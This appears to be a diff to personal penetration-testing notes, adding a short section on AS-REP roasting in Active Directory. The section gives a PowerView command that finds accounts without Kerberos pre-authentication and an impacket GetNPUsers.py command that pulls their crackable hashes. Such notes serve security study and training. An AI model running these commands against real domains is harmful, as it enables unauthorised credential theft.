@@ -32,3 +32,17 @@ adidnsdump -u [domain]\\[user] ldap://[dc-ip] -r
 
 head records.csv
 ```
+
+## ASREPRoasting
+This allows us to get an encrypted [[Kerberos#Ticket Granting Ticket (TGT)|TGT]] for a user that we can then decrypt offline. We can use [[Credentialed Enumeration#PowerView|PowerView]] to search for accounts that don't require kerberos pre-auth:
+```PowerShell
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+
+We can then use [[Rubeus]] to execute the attack:
+![[Rubeus#ASREPRoasting]]
+
+We can also use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) 
+```bash
+GetNPUsers.py [DOMAIN]/ -dc-ip [dc-ip] -no-pass -usersfile [users]
+```
